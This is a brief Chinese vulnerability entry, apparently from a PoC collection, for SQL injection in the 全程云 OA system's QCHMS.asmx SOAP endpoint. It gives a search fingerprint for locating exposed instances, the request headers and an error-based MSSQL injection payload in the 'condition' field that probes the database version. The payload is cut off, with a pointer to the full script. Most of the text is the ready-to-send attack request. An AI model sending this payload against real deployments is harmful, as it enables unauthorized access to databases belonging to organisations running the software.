# 全程云OAQCHMS.asmx存在SQL注入漏洞

- **系统**：全程云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`product="全程云-管理系统"`
- **请求**：`POST /OA/HMS/QCHMS.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetProjectResumeList"`　`Cookie: td_cookie=2806975495`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetProjectResumeList xmlns="http://tempuri.org/">
<pageIndex>1</pageIndex>
<pageSize>20</pageSize>
<condition> AND 1078 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(118)+CHAR(113)+
(SELECT (CASE WHEN (SUBSTRING(@@version,1,1)=CHAR(77)) THEN CHAR(49) ELSE CHAR(48) END))+
CHAR(113)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)))</condition>
</GetProjectResumeList>
</soap:Body>
</so…（脚本共 612 字，完整版见原文）
```
- **预期**：200　|　—